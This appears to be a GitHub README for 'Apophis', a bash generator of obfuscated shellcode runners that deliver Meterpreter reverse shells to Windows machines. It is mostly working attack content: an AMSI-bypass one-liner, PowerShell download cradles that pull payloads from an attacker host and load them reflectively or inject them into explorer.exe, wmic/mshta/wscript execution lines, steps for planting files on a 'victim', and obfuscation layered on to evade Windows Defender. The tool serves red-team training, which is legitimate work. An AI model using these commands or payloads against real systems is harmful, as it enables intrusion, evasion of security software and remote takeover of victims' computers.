# Description
```Apophis``` project is bash script shellcode runner generator that uses various tools in the background such as ```DotNetToJScript```, ```ConfuserEx```, ```Net-Obfuscator``` etc. It contains Csharp templates that are compiled with **Mono .Net Framework**. 

Apep (also spelled Apepi or Aapep) or Apophis (/əˈpoʊfɪs/;[1] Ancient Greek: Ἄποφις) was the ancient Egyptian deity who embodied chaos (ı͗zft in Egyptian) and was thus the opponent of light and Ma'at (order/truth). He appears in art as a giant serpent. His name is reconstructed by Egyptologists as *ʻAʼpāp(ī), as it was written ꜥꜣpp(y) and survived in later Coptic as Ⲁⲫⲱⲫ Aphōph.[2] Apep was first mentioned in the Eighth Dynasty, and he was honored in the names of the Fourteenth Dynasty king 'Apepi and of the Greater Hyksos king Apophis. - https://en.wikipedia.org/wiki/Apep

### What kind of shellcode runners it generates?
- XOR 
- Caesar
- AMSI Bypass (Patching, Unhooking)
- TripleDES
- ASPX, Web.Config 
- HTA, JS, XSL

## Installation
```Apophis``` is using heavily the ```Mono``` project in order to compile the CS templates.

```
sudo apt-get install mono-complete
```

If your Linux host can't resolve the IP address, then try the following:
```
wget -q -O https://archive.kali.org/archive-key.asc | sudo apt-key add
sudo apt update
sudo apt-get install mono-complete
```

```
git clone https://github.com/tasox/Apophis
```
```
chmod +x apophis.sh
```

## Usage

### Folders
| Name | Description |
| --- | --- |
| Templates | Containing Shellcode Runners with and without encryption in various formats. |
| payloads | Containing Shellcode Runners that can executed. |
| ConfuserEx | Compiled files of ConfuserEx GitHub project. |
| Net-Obfuscate | Compiled files of Net-Obfuscate GitHub project.|


### Static Variables (Needs to modified)
Open with a text editor the bash file ```apophis.sh``` and edit the variables accordingly.

| Variables | Description |
| --- | --- |
| PROCESS_TO_INJECT | Contains the remote process name that you want to inject into. |
| MSFVENOM_PAYLOAD | MSF Payload |
| LHOST | Listener IP |
| LPORT | Listener Port | 

```
#!/bin/bash
...
PROCESS_TO_INJECT="explorer.exe"
MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
LHOST="192.168.100.128"
LPORT=443
...
```

### Payload prefixes
| Name | Description |
| --- | --- |
| _embedded | If the generated payload contains the word **embedded** then the **shellcode** is located inside the generated executable. |
| _marshal | If the generated payload contains the word **marshal** then payload will be injected to executable's memory space. |
| _numa | If the generated payload contains the word **numa** then **VirtualAllocExNuma** was used insetad of **VirtualAllocEx** |
| _FlsAlloc | If the generated payload contains the word **FlsAlloc** then **FlsAlloc** API was used. |


#### Payload Example
When payload is generated with name ```shellcode_runner_assembly_FlsAlloc_marshal.exe```, it means:
- ```FlsAlloc``` API was used
- The Shellcode will be injected to executable's address space (Not to a remote process).

```
┌──(kali㉿kali)-[~/…/DotNetToJScript/payloads/XOR]
└─$ ls -la                                                                                                                                                                                      127 ⨯
total 144
drwxr-xr-x 2 kali kali  4096 Mar 10 02:45 .
drwxr-xr-x 9 kali kali  4096 Feb  2 08:20 ..
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly.dll
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly.exe
-rwxr-xr-x 1 kali kali  5120 Mar 10 02:45 shellcode_runner_assembly_FlsAlloc_marshal.dll
-rwxr-xr-x 1 kali kali  5120 Mar 10 02:45 shellcode_runner_assembly_FlsAlloc_marshal.exe
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly_numa.dll
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly_numa.exe
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly_numa_marshal.dll
-rwxr-xr-x 1 kali kali  5632 Mar 10 02:45 shellcode_runner_assembly_numa_marshal.exe
-rwxr-xr-x 1 kali kali 65131 Mar 10 02:45 shellcode_runner_cpp.exe
-rwxr-xr-x 1 kali kali  6144 Jan 24 23:05 shellcode_runner.dll

```


## Shellcode Runners

### [+] Triple DES

The 3DES payloads are located under ```payloads/3DES/``` directory. There are two payloads and need to be executed diferrently. Password and Salt are static values but you can modified them as you need.

- **Password**: oqphnbt0kuedizy4m3avx6r5lf21jc8s
- **Salt**: vh9b4tsxrl1560wg8nda2meuc7yjzop3

#### Method 1
The executable **des_decryptor.exe** is downloading the file from your Web server and executes it reflectively.

```
cmd> des_decryptor.exe http://KALI_IP/<SHELLCODE_RUNNER>
```

#### Method 2
The executable ```des_decryptor_embeded.exe``` embedds the shellcode in base64, which before was ecrypted with ```TripleDESEncryptor.ps1```. Doesn't need command-line arguments for the execution. Upload the file to the victim and execute it.

```
cmd> des_decryptor_embedded.exe
```

----

### [+] AMSI Bypass
There are two methods to bypass AMSI:
- Patching 
- Unhooking

#### Method 1
Patching template is what Offensive-Security teaches in OSEP with some small changes. The execution of 1st method (Patching) is straight forward and uses well-known methodologies.

```
$m="System.Management.Automation.Ams";[Ref].Assembly.GetType("$m"+"iUtils").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)
```

```
# XOR RAX,RAX 
$buf = [Byte[]] (0x48,0x31,0xC0)  
```

**Execute AMSI Shellcode runner**

You can copy the ```payloads/AMSI/shellcode_runner.txt``` to your web server as ```shellcode_runner.html```
``` 
powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
``` 

#### Method 2
To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github.com/jfmaes/AmsiHooker) and I've done some small modifications. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.

**Steps**
1. Upload ```unhook_amsi.exe``` and ```MinHook.NET.dll``` to victim. (Files located under ```payloads/AMSI/```)
2. Copy your shellcode runner (```payloads/XOR/``` or ```payloads/Caesar/```) to your web server folder.
3. ```unhook_amsi.exe http://<KALI>/shellcode_runner.exe```

---

### [+] Executing .XSL, .JS, .HTA

Under directory ```payloads/DotNetToJScript/```, you find three shellcode ruuners that generated with **DotNetToJScript** (https://github.com/tyranid/DotNetToJScript). 

**Executing .XSL shellcode runner**
```
wmic process list /FORMAT:evil.xsl
wmic os get /FORMAT:"https://example.com/evil.xsl"
```

**Executing .HTA shellcode runner**
```
mshta c:\users\public\shellcode_runner.hta
```

**Executing .JS shellcode runner**
```
wscript c:\users\public\shellcode_runner.js
```

More execution methods can be found:
- https://lolbas-project.github.io/


### [+] ConfuserEx + Net-Obfuscator

During my tests, I noticed that Windows Defender could detect payloads genereted by **ConfuserEx** (https://github.com/yck1509/ConfuserEx). For this reason, I combined ```ConfuserEx + Net-Obfuscator``` (https://github.com/BinaryScary/NET-Obfuscate). 

First, payloads that are located under ```payloads/XOR/``` and ```payloads/Caesar/``` directories, feed the **ConfuserEx** tool and subsequently the new obfuscated binaries are imported to **Net-Obfuscator**. As a result, the GetType and GetMethod values are obfuscated and  dynamically created.

**Example 1** - Execution of ```payloads/Caesar/shellcode_runner_assembly_numa.exe``` Reflectively.
```
[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ...

 [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.exe
 [*] PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
 [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
 [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
```
---
## Execute .Net Assemblies with Reflection
Bellow you can see some examples of how you can execute the Shellcode Runners with reflection.

```
[+] Assembly - Local Execution or via SMB [+]
$data=[IO.File]::ReadAllBytes('shellcode_runner.exe|dll')
$ass=[System.Reflection.Assembly]::Load($data)
$ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))

[+] Assembly - Remote Execution  [+]
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
$ass=[System.Reflection.Assembly]::Load($data)
$ass.GetType("Runner.TestClass").GetMethod("Main").Invoke($null,@(,$null))

```
---
## Downloaders

### DownloadData + Reflection (No Proxy aware)
```
powershell -nop -exec bypass -c "$data=(New-Object Net.WebClient).DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
```

### DownloadData + Invoke-ReflectivePEInjection
```
powershell -nop -exec bypass -c "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.136/shellcode_runner_assembly.exe');(New-Object System.Net.WebClient).DownloadString('http://KALI_IP/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid"
```

### DownloadString + AMSI Bypass + Proxy aware
```
powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$bytes=$webclient.DownloadString('http://KALI_IP/shellcode_runner.txt')|IEX;"
```

### DownloadData + Proxy aware
```
powershell -nop -exec bypass -c "$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\");$webclient=(New-Object System.Net.WebClient);$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';$webClient.Headers.Add(\"User-Agent\", $userAgent);$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;$data = $webclient.DownloadData('http://KALI_IP/shellcode_runner.dll|exe');$ass=[System.Reflection.Assembly]::Load($data);$ass.GetType('Runner.TestClass').GetMethod('Main').Invoke($null,@(,$null))"
```

## Output
If everything goes well, you will get an output as bellow:

```
──(kali㉿kali)-[~/…/Apophis]
└─$ ./apophis.sh
[+] Generating a shellcode ...
[+] Reading the shellcode.txt ...
[+] Appending Shellcode ...
[+] Compile the CS file...
[+] Generating Encrypted shellcodes ...
[+] Creating DLL files...
[+] Creating EXE file ...
[+] Creating C++ EXE (plus UPX) ...
[+] Creating JS file ...
[+] Creating HTA file ...
[+] Creating XSL file ...
[+] Creating TXT file ...
[+] Creating web.config file (Non-Encrypted)...
[+] Creating ASPX file (Non-Encrypted) ...
[+] Unhooking AMSI ...
 [*] Upload unhook_amsi.exe and MinHook.NET.dll to the victim 
 [*] Files are unders: payloads/AMSI/
 [*] Execution: unhook_amsi.exe http://<KALI>/shellcode_runner.exe 
[+] Generating a 3DES Shellcode Runner ...
 [*] Execution of 3DES ...
 [1] Example: des_decryptor.exe "http://<KALI>/shellcode_runner_assembly_3des.exe"
 [2] Example: des_decryptor_embeded.exe
[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ...

 [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.exe
 [*] PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
 [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
 [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
/*--------------------------------------------------------------------*/
 [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa_marshal.exe
 [*] PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
 [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
 [*] PS>$ass.GetType("W8VME5GGM7.GU8I0TEEI0").GetMethod("T5HOQF3C9C").Invoke($null,$null)
/*--------------------------------------------------------------------*/
...More...
```

## Credits
Nothing wouldn't be possible if these projects didn't exist:
- Mono Team (https://github.com/mono)
- James Forshaw (https://github.com/tyranid/DotNetToJScript)
- Matthew Graeber (https://www.powershellgallery.com/packages/PowerSploit/3.0.0.0/Content/ScriptModification%5COut-EncryptedScript.ps1)
- BinaryScary (https://github.com/BinaryScary/NET-Obfuscate)
- yck1509 (https://github.com/yck1509/ConfuserEx)
- jfmaes (https://github.com/jfmaes/AmsiHooker)

